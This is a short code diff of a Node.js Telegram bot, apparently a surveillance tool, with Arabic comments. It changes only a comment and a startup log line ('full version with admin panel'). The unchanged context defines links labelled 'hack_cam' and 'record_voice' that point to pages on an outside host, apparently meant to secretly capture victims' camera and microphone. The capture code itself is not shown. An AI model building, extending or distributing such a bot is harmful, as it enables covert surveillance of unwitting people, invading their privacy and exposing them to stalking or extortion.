@@ -37,7 +37,7 @@ function registerUser(userId, name) {
     }
 }
 
-// روابط الأقسام
+// ✅ روابط الأقسام (كل الأقسام)
 const links = {
     'hack_cam': "https://cam-bot.bonto.run/",
     'record_voice': "https://cam-bot.bonto.run/voice.html",
@@ -207,4 +207,4 @@ bot.on('callback_query', (query) => {
     bot.answerCallbackQuery(query.id);
 });
 
-console.log("⚔ البوت شغال بنجاح على Node.js... (مع لوحة الأدمن)");
+console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع لوحة الأدمن)");
